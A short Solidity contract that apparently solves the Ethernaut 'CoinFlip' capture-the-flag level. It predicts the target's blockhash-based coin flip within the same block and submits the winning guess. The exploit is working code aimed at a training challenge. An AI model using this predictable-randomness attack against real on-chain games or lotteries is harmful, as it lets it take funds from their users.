// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// This tells your contract that the target has a "flip" function it can call
interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {

    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // This function runs the cheat calculations and instantly forwards the right answer
    function hackFlip(address _ethernautLevelAddress) public {

        // Calculate the exact "random" answer for the CURRENT block
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool perfectGuess = (coinFlip == 1 ? true : false);

        // Link the interface to the target Ethernaut contract address
        CoinFlip targetContract = CoinFlip(_ethernautLevelAddress);

        // Fire the perfect guess directly into the Ethernaut contract
        targetContract.flip(perfectGuess);
    }
}